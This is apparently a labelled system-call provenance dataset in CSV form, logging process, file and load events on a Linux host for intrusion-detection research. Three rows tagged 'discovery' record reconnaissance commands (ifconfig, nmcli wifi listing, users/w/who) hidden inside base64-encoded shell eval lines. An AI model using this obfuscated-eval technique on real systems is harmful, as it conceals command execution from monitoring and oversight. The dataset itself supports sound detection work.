id,type,from,to,uid,egid,exe,gid,euid,name,pid,seen time,source,ppid,command line,start time,event id,time,operation,path,subtype,permissions,epoch,version,flags,local address,remote port,protocol,remote address,local port,tgid,fd,mode,label,subLabel,window
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169853.0,1701570978.232,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169855.0,1701570982.068,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169876.0,1701570985.895,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169878.0,1701570989.102,unlink,,,,,,,,,,,,,,,0,0,28359516
9eeff03ee29b0c6fdf4f242435824b2b,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,101566.0,1701570989.942,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359516
12a0688cea225d1dfc9cd157f116ccea,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,101566.0,,syscall,4127.0,"sh -c eval ""$(echo aWZjb25maWc= | base64 --decode)""",1701570989.942,,,,,,,,,,,,,,,,,,1,discovery,28359516
,WasTriggeredBy,12a0688cea225d1dfc9cd157f116ccea,9eeff03ee29b0c6fdf4f242435824b2b,,,,,,,,,syscall,,,,169880.0,1701570989.942,execve,,,,,,,,,,,,,,,0,0,28359516
,Used,12a0688cea225d1dfc9cd157f116ccea,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,169880.0,1701570989.942,load,,,,,,,,,,,,,,,0,0,28359516
,Used,12a0688cea225d1dfc9cd157f116ccea,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,169880.0,1701570989.942,load,,,,,,,,,,,,,,,0,0,28359516
c25aababfb8cc622f2824e50d5340d6d,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,101569.0,1701570989.946,syscall,101567.0,,,,,,,,,,,,,,,,,,,,0,0,28359516
19b1bbffc2d14c6ed32478b2bf68b097,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,101569.0,,syscall,101567.0,base64 --decode,1701570989.946,,,,,,,,,,,,,,,,,,0,0,28359516
,WasTriggeredBy,19b1bbffc2d14c6ed32478b2bf68b097,c25aababfb8cc622f2824e50d5340d6d,,,,,,,,,syscall,,,,169881.0,1701570989.946,execve,,,,,,,,,,,,,,,0,0,28359516
,Used,19b1bbffc2d14c6ed32478b2bf68b097,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,169881.0,1701570989.946,load,,,,,,,,,,,,,,,0,0,28359516
,Used,19b1bbffc2d14c6ed32478b2bf68b097,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,169881.0,1701570989.946,load,,,,,,,,,,,,,,,0,0,28359516
5024698694e91a72c4034bbac4818817,Process,,,1000.0,1000.0,/usr/sbin/ifconfig,1000.0,1000.0,ifconfig,101570.0,1701570989.95,syscall,101566.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359516
e5b89efbcd13d743efbc6e06233219bf,Process,,,1000.0,1000.0,/usr/sbin/ifconfig,1000.0,1000.0,ifconfig,101570.0,,syscall,101566.0,ifconfig,1701570989.95,,,,,,,,,,,,,,,,,,1,discovery,28359516
,WasTriggeredBy,e5b89efbcd13d743efbc6e06233219bf,5024698694e91a72c4034bbac4818817,,,,,,,,,syscall,,,,169882.0,1701570989.95,execve,,,,,,,,,,,,,,,0,0,28359516
,Used,e5b89efbcd13d743efbc6e06233219bf,2a2bff9cc177e37ad988243df7fde318,,,,,,,,,syscall,,,,169882.0,1701570989.95,load,,,,,,,,,,,,,,,0,0,28359516
,Used,e5b89efbcd13d743efbc6e06233219bf,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,169882.0,1701570989.95,load,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169886.0,1701570993.734,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169889.0,1701570997.557,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169891.0,1701571001.1,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169893.0,1701571004.924,unlink,,,,,,,,,,,,,,,0,0,28359516
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,dc7dddf5afbc4ca1a41a580bc892aaa2,,,,,,,,,syscall,,,,169894.0,1701571008.111,rename (read),,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,3639f5745398d66677c34b1446f64e55,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,169894.0,1701571008.111,rename (write),,,,,,,,,,,,,,,0,0,28359516
,WasDerivedFrom,3639f5745398d66677c34b1446f64e55,dc7dddf5afbc4ca1a41a580bc892aaa2,,,,,,,1950.0,,syscall,,,,169894.0,1701571008.111,rename,,,,,,,,,,,,,,,0,0,28359516
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,92c563de24db60ec9af99388b0f2c8ae,,,,,,,,,syscall,,,,169895.0,1701571008.111,rename (read),,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,8b64838afea9fc87cd27c7dca9f58dc9,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,169895.0,1701571008.111,rename (write),,,,,,,,,,,,,,,0,0,28359516
,WasDerivedFrom,8b64838afea9fc87cd27c7dca9f58dc9,92c563de24db60ec9af99388b0f2c8ae,,,,,,,1950.0,,syscall,,,,169895.0,1701571008.111,rename,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,a51ce0b69d575831903a080382e8c394,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,169896.0,1701571008.111,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169898.0,1701571008.751,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169900.0,1701571011.943,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169921.0,1701571015.923,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,169923.0,1701571019.106,unlink,,,,,,,,,,,,,,,0,0,28359516
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175477.0,1701575163.025,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175479.0,1701575166.853,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175481.0,1701575170.681,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175485.0,1701575174.509,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175487.0,1701575178.33,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175489.0,1701575182.162,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175510.0,1701575185.994,unlink,,,,,,,,,,,,,,,0,0,28359586
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,14560f80ad816b6a377d392e7e04410b,,,,,,,,,syscall,,,,175511.0,1701575189.11,rename (read),,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,43c3b094dd34fd3870902ecd30f6dfe2,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,175511.0,1701575189.11,rename (write),,,,,,,,,,,,,,,0,0,28359586
,WasDerivedFrom,43c3b094dd34fd3870902ecd30f6dfe2,14560f80ad816b6a377d392e7e04410b,,,,,,,1950.0,,syscall,,,,175511.0,1701575189.11,rename,,,,,,,,,,,,,,,0,0,28359586
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,c4b41905f0def69a712680dabf9726be,,,,,,,,,syscall,,,,175512.0,1701575189.11,rename (read),,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,130fd16b3b2dc7a1e5065f1dcf49a0db,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,175512.0,1701575189.11,rename (write),,,,,,,,,,,,,,,0,0,28359586
,WasDerivedFrom,130fd16b3b2dc7a1e5065f1dcf49a0db,c4b41905f0def69a712680dabf9726be,,,,,,,1950.0,,syscall,,,,175512.0,1701575189.11,rename,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,c93d2c9b884c11d6432f6b0f29e45da5,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,175513.0,1701575189.114,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175515.0,1701575189.206,unlink,,,,,,,,,,,,,,,0,0,28359586
0bff9d3335286c1ca33bcd39251f6562,Process,,,0.0,0.0,/usr/lib/NetworkManager/nm-dispatcher,0.0,0.0,nm-dispatcher,105437.0,1701575191.03,syscall,1.0,,,,,,,,,,,,,,,,,,,,0,0,28359586
13ded6bcdec428417a1e5af8000514a6,Process,,,0.0,0.0,/usr/lib/NetworkManager/nm-dispatcher,0.0,0.0,nm-dispatcher,105437.0,,syscall,1.0,/usr/lib/NetworkManager/nm-dispatcher,1701575191.03,,,,,,,,,,,,,,,,,,0,0,28359586
,WasTriggeredBy,13ded6bcdec428417a1e5af8000514a6,0bff9d3335286c1ca33bcd39251f6562,,,,,,,,,syscall,,,,175516.0,1701575191.03,execve,,,,,,,,,,,,,,,0,0,28359586
,Used,13ded6bcdec428417a1e5af8000514a6,db9f2a3563e47ac42b8dc750533df6e5,,,,,,,,,syscall,,,,175516.0,1701575191.03,load,,,,,,,,,,,,,,,0,0,28359586
,Used,13ded6bcdec428417a1e5af8000514a6,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175516.0,1701575191.03,load,,,,,,,,,,,,,,,0,0,28359586
a1360e60b3dd852f7865a3578327db7a,Process,,,0.0,0.0,/usr/bin/dash,0.0,0.0,01-ifupdown,105440.0,1701575191.05,syscall,105437.0,,,,,,,,,,,,,,,,,,,,0,0,28359586
2f25359f93fc90e5c3e1781de5a15f1b,Process,,,0.0,0.0,/usr/bin/dash,0.0,0.0,01-ifupdown,105440.0,,syscall,105437.0,/bin/sh -e /etc/NetworkManager/dispatcher.d/01-ifupdown ens36 dhcp4-change,1701575191.05,,,,,,,,,,,,,,,,,,0,0,28359586
,WasTriggeredBy,2f25359f93fc90e5c3e1781de5a15f1b,a1360e60b3dd852f7865a3578327db7a,,,,,,,,,syscall,,,,175518.0,1701575191.05,execve,,,,,,,,,,,,,,,0,0,28359586
,Used,2f25359f93fc90e5c3e1781de5a15f1b,78ac58e5c4f62b11205d173eb3ad8b04,,,,,,,,,syscall,,,,175518.0,1701575191.05,load,,,,,,,,,,,,,,,0,0,28359586
,Used,2f25359f93fc90e5c3e1781de5a15f1b,bdc2ca1d94be5a3958f6621d8b52fdb0,,,,,,,,,syscall,,,,175518.0,1701575191.05,load,,,,,,,,,,,,,,,0,0,28359586
,Used,2f25359f93fc90e5c3e1781de5a15f1b,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175518.0,1701575191.05,load,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175520.0,1701575194.87,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175523.0,1701575200.199,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175526.0,1701575204.827,unlink,,,,,,,,,,,,,,,0,0,28359586
4fc92c52e8ff272fb95d1a70b814976c,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,105454.0,1701575208.631,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359586
6ba33703fa04fea85772a623bd647aa4,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,105454.0,,syscall,4127.0,"sh -c eval ""$(echo bm1jbGkgZGV2IHdpZmk= | base64 --decode)""",1701575208.631,,,,,,,,,,,,,,,,,,1,discovery,28359586
,WasTriggeredBy,6ba33703fa04fea85772a623bd647aa4,4fc92c52e8ff272fb95d1a70b814976c,,,,,,,,,syscall,,,,175528.0,1701575208.631,execve,,,,,,,,,,,,,,,0,0,28359586
,Used,6ba33703fa04fea85772a623bd647aa4,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,175528.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
,Used,6ba33703fa04fea85772a623bd647aa4,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175528.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
e093824e5112d9f10e61616f123c7db3,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,105457.0,1701575208.631,syscall,105455.0,,,,,,,,,,,,,,,,,,,,0,0,28359586
c465782d0d8ed38edbbe05371a173e98,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,105457.0,,syscall,105455.0,base64 --decode,1701575208.631,,,,,,,,,,,,,,,,,,0,0,28359586
,WasTriggeredBy,c465782d0d8ed38edbbe05371a173e98,e093824e5112d9f10e61616f123c7db3,,,,,,,,,syscall,,,,175529.0,1701575208.631,execve,,,,,,,,,,,,,,,0,0,28359586
,Used,c465782d0d8ed38edbbe05371a173e98,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,175529.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
,Used,c465782d0d8ed38edbbe05371a173e98,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,175529.0,1701575208.631,load,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175531.0,1701575208.655,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175533.0,1701575211.855,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175554.0,1701575215.688,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,38bdf9c568fae2703ceefbb1ef16907d,,,,,,,,,syscall,,,,175556.0,1701575219.208,unlink,,,,,,,,,,,,,,,0,0,28359586
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180334.0,1701578643.119,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180336.0,1701578646.943,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180338.0,1701578650.771,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180340.0,1701578654.595,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180342.0,1701578658.403,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180344.0,1701578662.231,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180365.0,1701578666.055,unlink,,,,,,,,,,,,,,,0,0,28359644
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f605d4098ebd480a8869a25dc937935c,,,,,,,,,syscall,,,,180366.0,1701578669.111,rename (read),,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,4e633a88eeb0221eea065fc6db2a802f,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,180366.0,1701578669.111,rename (write),,,,,,,,,,,,,,,0,0,28359644
,WasDerivedFrom,4e633a88eeb0221eea065fc6db2a802f,f605d4098ebd480a8869a25dc937935c,,,,,,,1950.0,,syscall,,,,180366.0,1701578669.111,rename,,,,,,,,,,,,,,,0,0,28359644
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f2c9ef1e2bc79a6afa4959ed5a8d6628,,,,,,,,,syscall,,,,180367.0,1701578669.111,rename (read),,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,d6ac64150d237f46cb9cd157354be12b,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,180367.0,1701578669.111,rename (write),,,,,,,,,,,,,,,0,0,28359644
,WasDerivedFrom,d6ac64150d237f46cb9cd157354be12b,f2c9ef1e2bc79a6afa4959ed5a8d6628,,,,,,,1950.0,,syscall,,,,180367.0,1701578669.111,rename,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,0a6ad9185864bf9a614a35f8abccb288,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,180368.0,1701578669.111,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180370.0,1701578669.291,unlink,,,,,,,,,,,,,,,0,0,28359644
fb541f3982cc0b046f30a1d20cccd7ed,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,108683.0,1701578671.687,syscall,4127.0,,,,,,,,,,,,,,,,,,,,1,discovery,28359644
436db26a476d5bf76a0dd0830e112e47,Process,,,1000.0,1000.0,/usr/bin/dash,1000.0,1000.0,sh,108683.0,,syscall,4127.0,"sh -c eval ""$(echo dXNlcnM7IHc7IHdobw== | base64 --decode)""",1701578671.687,,,,,,,,,,,,,,,,,,1,discovery,28359644
,WasTriggeredBy,436db26a476d5bf76a0dd0830e112e47,fb541f3982cc0b046f30a1d20cccd7ed,,,,,,,,,syscall,,,,180372.0,1701578671.687,execve,,,,,,,,,,,,,,,0,0,28359644
,Used,436db26a476d5bf76a0dd0830e112e47,5b5b71f1a2252e659e04568f2eb536f2,,,,,,,,,syscall,,,,180372.0,1701578671.687,load,,,,,,,,,,,,,,,0,0,28359644
,Used,436db26a476d5bf76a0dd0830e112e47,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,180372.0,1701578671.687,load,,,,,,,,,,,,,,,0,0,28359644
bef8186802ac0174fc26cf37880a29fa,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,108686.0,1701578671.691,syscall,108684.0,,,,,,,,,,,,,,,,,,,,0,0,28359644
9287f308278f8f487245119309f55b14,Process,,,1000.0,1000.0,/usr/bin/base64,1000.0,1000.0,base64,108686.0,,syscall,108684.0,base64 --decode,1701578671.691,,,,,,,,,,,,,,,,,,0,0,28359644
,WasTriggeredBy,9287f308278f8f487245119309f55b14,bef8186802ac0174fc26cf37880a29fa,,,,,,,,,syscall,,,,180373.0,1701578671.691,execve,,,,,,,,,,,,,,,0,0,28359644
,Used,9287f308278f8f487245119309f55b14,f2a021a711b90a6f22107bf4ea0ac7de,,,,,,,,,syscall,,,,180373.0,1701578671.691,load,,,,,,,,,,,,,,,0,0,28359644
,Used,9287f308278f8f487245119309f55b14,02a4195a9866b7c9eba7405c13110dad,,,,,,,,,syscall,,,,180373.0,1701578671.691,load,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180375.0,1701578675.5,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180377.0,1701578679.32,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180379.0,1701578683.144,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180381.0,1701578686.972,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180383.0,1701578690.8,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180385.0,1701578694.612,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,180406.0,1701578699.24,unlink,,,,,,,,,,,,,,,0,0,28359644
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184408.0,1701581703.192,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184410.0,1701581707.012,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184413.0,1701581710.84,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184415.0,1701581714.664,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184417.0,1701581718.488,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184421.0,1701581723.733,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184442.0,1701581729.361,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184444.0,1701581733.185,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184446.0,1701581737.013,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184448.0,1701581740.841,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184450.0,1701581744.665,unlink,,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,cd0813274ef046cf6ef72a2349f2bef3,e8e2a4974befcb8b3898b50cdf18e36f,,,,,,,,,syscall,,,,184452.0,1701581748.486,unlink,,,,,,,,,,,,,,,0,0,28359695
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,f0d49420a6b35e37dbbd7866edd49d83,,,,,,,,,syscall,,,,184453.0,1701581749.106,rename (read),,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,a5dcb1c692b1e39d24290650b6172650,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,184453.0,1701581749.106,rename (write),,,,,,,,,,,,,,,0,0,28359695
,WasDerivedFrom,a5dcb1c692b1e39d24290650b6172650,f0d49420a6b35e37dbbd7866edd49d83,,,,,,,1950.0,,syscall,,,,184453.0,1701581749.106,rename,,,,,,,,,,,,,,,0,0,28359695
,Used,dc3cad4762a75f7ad2c4f9d13a61c057,ebf5d637441bc4066a1bf597c38a6805,,,,,,,,,syscall,,,,184454.0,1701581749.106,rename (read),,,,,,,,,,,,,,,0,0,28359695
,WasGeneratedBy,18c1d8e0ef95f2d4797d7379694ed7ef,dc3cad4762a75f7ad2c4f9d13a61c057,,,,,,,,,syscall,,,,184454.0,1701581749.106,rename (write),,,,,,,,,,,,,,,0,0,28359695
